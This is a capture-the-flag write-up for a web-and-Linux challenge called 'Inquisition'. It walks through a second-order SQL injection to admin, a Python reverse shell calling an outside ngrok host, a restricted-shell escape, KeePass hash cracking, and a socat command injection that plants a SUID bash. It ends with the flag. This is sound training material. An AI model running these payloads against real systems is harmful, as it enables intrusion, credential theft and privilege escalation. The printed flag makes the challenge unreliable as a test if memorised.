
# Inquisition, Hard

# Description: 

`As the veil between dreams and nightmare thins, apocalypse becomes a certainty.`

# Deployment: 

Image build:

`docker build -t inquisition .`

Run the container:

`docker run -p 5555:80 6001:22 inquisition`

# Write up

We've got authorization and registration forms:


<img width="841" alt="image" src="https://github.com/user-attachments/assets/faae2988-e8af-41ec-a9a6-ef5cac0b1444">


Let's register a new user and authorize using its credentials:


<img width="849" alt="image" src="https://github.com/user-attachments/assets/2f79335b-db19-40b3-9ed9-a35d4a510bd8">


Not much we can do – change password and logout, let's try using first option: 


<img width="846" alt="image" src="https://github.com/user-attachments/assets/d399e5d3-c1cf-4139-8da8-784668f7025f">


Logging in with the new password works as well. 

Welcome screen says "Welcome home, user!" – is there any chance we could log in as an admin?

Login form itself is not vulnerable to any bruteforce or SQL-injection attacks.

Considering a password change function, there's probably a database behind our application that allows us to update current user's password using a SQL query, which could be vulnerable to **second-order SQL-injection**

Let's register a new user with the name of `admin' -- -` and set its password then just login


<img width="842" alt="image" src="https://github.com/user-attachments/assets/d17d40ef-8496-4339-9265-86bf6b326262">


Now try to change the fake admin's password to, for example, 'admin'

Try to log in using credentials `admin:admin` and it leads us to the admin page: 


<img width="851" alt="image" src="https://github.com/user-attachments/assets/2eb5aebc-6732-4ceb-b54b-dee786dd8253">


Here we have some API instructions: 


<img width="842" alt="image" src="https://github.com/user-attachments/assets/c9a4d3ff-fab2-41df-b891-e92f71f2949b">


Exploring them, we find two interesting API's that could be used to gain RCE:


<img width="862" alt="image" src="https://github.com/user-attachments/assets/f2518c0e-3f8c-4593-8ae4-e9592006c4e0">


First API fetches the content from the presented page and saves it to the specified file, the second API runs module from `./modules` directory.

Second API runs the script from the `modules` directory.

Let's create a reverse-shell script using python:

```
import socket,subprocess,os;
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);
s.connect(("0.tcp.jp.ngrok.io",10336));
os.dup2(s.fileno(),0); 
os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);
import pty; pty.spawn("/bin/bash")
```

Then upload it using first API:

<img width="848" alt="image" src="https://github.com/user-attachments/assets/d3f70299-fbbd-496b-9835-ae41e88f5fab">


And run using second API:

<img width="858" alt="image" src="https://github.com/user-attachments/assets/c21aa641-9501-485f-aeb2-a8362b2e750f">


We have successfully gained RCE using API's, but we find ourselves in a restricted shell enviroment, which is not good at all for our goals: 


<img width="371" alt="image" src="https://github.com/user-attachments/assets/4531bfea-d47b-4499-afb3-fe80dd0412fe">


We're lucky to have an access to the Vim binary though, which allows us to break out of the restricted shell:

```
:set shell=/bin/sh
:shell
```

We're now in a much better enviroment, lets export default PATH variable to access all the binaries

<img width="515" alt="image" src="https://github.com/user-attachments/assets/0300ea38-5356-4c15-b9b9-de747a440742">


In a /home directory we find a Keepass2 database, let's crack it using john or hashcat:

```

┌──(kali㉿kali)-[~/Desktop]
└─$ keepass2john Database.kdbx > brute && john brute
Using default input encoding: UTF-8
Loaded 1 password hash (KeePass [SHA256 AES 32/64])
Cost 1 (iteration count) is 60000 for all loaded hashes
Cost 2 (version) is 2 for all loaded hashes
Cost 3 (algorithm [0=AES 1=TwoFish 2=ChaCha]) is 0 for all loaded hashes
Will run 4 OpenMP threads
Proceeding with single, rules:Single
Press 'q' or Ctrl-C to abort, almost any other key for status
Warning: Only 6 candidates buffered for the current salt, minimum 8 needed for performance.
Almost done: Processing the remaining buffered candidate passwords, if any.
Proceeding with wordlist:/usr/share/john/password.lst
nothing          (Database)     
1g 0:00:00:02 DONE 2/3 (2024-08-24 01:46) 0.3610g/s 449.8p/s 449.8c/s 449.8C/s frodo..barbara
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

Inside the database we find an attachment called "hashes", let's try to crack them:

<img width="846" alt="image" src="https://github.com/user-attachments/assets/ba4dad14-b707-4720-b3a3-fa2c1b82a3cf">


We gain two possible credential pairs – `darel:weakness` and `darel:goodpassword`, the last one turns to be valid for ssh:

`ssh darel@hostname -p port`

Exploring the machine, we find a listening port using `netstat -l`


<img width="744" alt="image" src="https://github.com/user-attachments/assets/963c55a9-cadb-4fee-9236-07aee81c1562">



Using **socket command injection**, let's copy bash binary, set suid and execution rights on it:

`echo "cp /bin/bash /tmp/bash; chmod +s /tmp/bash; chmod +x /tmp/bash;" | socat - UNIX-CLIENT:/bin/socket.s`

PWNed!

<img width="806" alt="image" src="https://github.com/user-attachments/assets/1cc942f7-4c42-47ed-b600-3e8ab0a92bae">


## Flag: tqlCTF{1nQu1s1t1on_l34ds_to_w0rld5_d3s7Ruc710n}
